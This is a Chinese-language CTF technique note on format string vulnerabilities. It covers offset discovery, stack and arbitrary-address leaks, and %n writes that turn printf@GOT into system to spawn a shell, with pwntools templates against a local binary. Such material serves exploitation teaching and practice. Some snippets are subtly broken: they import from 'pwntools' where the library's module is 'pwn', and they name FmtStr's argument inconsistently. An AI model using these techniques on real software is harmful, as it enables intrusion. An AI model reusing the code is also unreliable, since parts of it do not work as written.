---
category: pwn
tags: [format_string, printf, arbitrary_read, arbitrary_write, got_overwrite, fmt, 格式化字符串, 任意读写]
triggers: ["format string", "printf", "fprintf", "sprintf", "%n", "%s", "%p", "got overwrite", "格式化字符串", "fmt"]
related: [ret2libc, rop_chain, got_hijack]
---

# 格式化字符串漏洞

## 什么时候用

程序把用户输入直接传给 `printf(user_input)` 而非 `printf("%s", user_input)`。可以实现任意地址读和任意地址写。

## 前提条件

- 存在 `printf(buf)` / `fprintf(fd, buf)` / `sprintf(dst, buf)` 调用，`buf` 可控
- 知道 format string 在栈上的偏移（或能爆破）
- 写 GOT 需要 Partial RELRO（Full RELRO 下 GOT 只读）

## 攻击步骤

### 1. 确认漏洞 & 找偏移

发送 `AAAA%p.%p.%p.%p...` 看输出中是否出现 `0x41414141`（即我们输入的 `AAAA`）。

精确找偏移：
```python
# 逐个试 %N$p
for i in range(1, 50):
    p.sendline(f"AAAA%{i}$p")
    resp = p.recvline()
    if b"0x41414141" in resp:
        print(f"Offset: {i}")
        break
```

或用 pwntools 自动找：
```python
from pwntools import FmtStr

def exec_fmt(payload):
    p = process('./vuln')
    p.sendline(payload)
    return p.recvall()

fmt = FmtStr(exec_fmt=exec_fmt)
print(f"Offset: {fmt.offset}")
```

### 2. 任意读（Leak）

**读栈上的值**（leak libc 地址、canary 等）：
```python
# 泄露栈上第 N 个位置的值
payload = f"%{N}$p".encode()  # 以 hex 输出
payload = f"%{N}$s".encode()  # 以字符串输出（读指针指向的内容）
```

**读任意地址**（no-PIE 时地址已知）：
```python
# 关键：地址放在 payload 末尾，因为地址含 \x00 会截断 printf
addr = 0x0804a020  # 要读的地址
offset = 7  # format string 在栈上的偏移

# 64 位
payload = f"%{offset + 1}$s|||".encode().ljust(16, b'A') + p64(addr)

# 32 位
payload = p32(addr) + f"%{offset}$s".encode()
```

⚠️ **64 位注意**：地址含 `\x00`（如 `0x00007f...`），放在 payload 前面会截断 printf。必须放末尾，调整偏移。

### 3. 任意写（GOT Overwrite）

核心思路：用 `%n` 往指定地址写入"已输出字符数"。常用来改写 `printf@GOT` → `system@PLT`，这样下次 `printf(buf)` 变成 `system(buf)`。

**用 pwntools FmtStr（推荐）**：
```python
from pwntools import FmtStr

elf = ELF('./vuln')

def send_payload(payload):
    p.sendline(payload)
    return p.recvline()

fmt = FmtStr(execute_fmt=send_payload, offset=OFFSET)
fmt.write(elf.got['printf'], elf.plt['system'])
fmt.execute_writes()

# 现在 printf(buf) = system(buf)
p.sendline('/bin/sh')
p.interactive()
```

**手动构造（理解原理）**：
```python
# %hn 写 2 字节，%hhn 写 1 字节，%n 写 4 字节
# 写入值 = 前面已输出的字符数

# 例：往 0x0804a020 写入 0x0804 (高 2 字节) 和 0x8534 (低 2 字节)
# 先写小值，再写大值（因为字符数只能增不能减）
```

### 4. 一次性攻击（只有一次 printf 机会）

如果只能触发一次 printf：
- 覆写 `.fini_array`（程序退出时会调用这里的函数）让程序跳回 `main`，获得第二次机会
- 或者一次性同时写多个地址（用 `%hn` 分 2 字节写）

## 常见坑

- **`%n` 被禁用**：某些 libc 版本的 `_FORTIFY_SOURCE=2` 会禁止 `%n`。此时只能用来 leak，不能写。
- **输出缓冲**：`printf` 可能不立即输出，需要 `\n` 或 `fflush`。
- **偏移计算错误**：64 位下地址 8 字节，padding 要对齐到 8 字节边界。
- **写入值太大**：`%n` 一次性输出几万字符很慢，用 `%hn`（2 字节写）或 `%hhn`（1 字节写）分次写。
- **栈上没有目标地址**：如果你需要往 GOT 写，但 GOT 地址不在栈上，需要先把地址"放到栈上"——通过 payload 本身包含地址。

## 变体

### 读变体
- **Leak canary**：`%11$p`（canary 通常在栈上某个固定偏移）
- **Leak libc**：`%13$p`（`__libc_start_main` 的返回地址通常在栈上）
- **Leak PIE base**：`%N$p`（leak `.text` 段的某个地址，减去偏移得到 base）

### 写变体
- **GOT hijack**：printf → system 是经典组合
- **malloc_hook / free_hook**：写 `__malloc_hook` 或 `__free_hook` 为 one_gadget（glibc < 2.34）
- **返回地址覆写**：直接改栈上的返回地址（需要知道栈地址）

### 结合其他漏洞
- Format string leak + [[ret2libc]]：先用格式化字符串泄露 libc 地址和 canary，再用栈溢出做 ROP

## 相关技术

- [[ret2libc]] — leak 之后的常见后续攻击
- [[rop_chain]] — 如果能改返回地址，可以直接构造 ROP chain
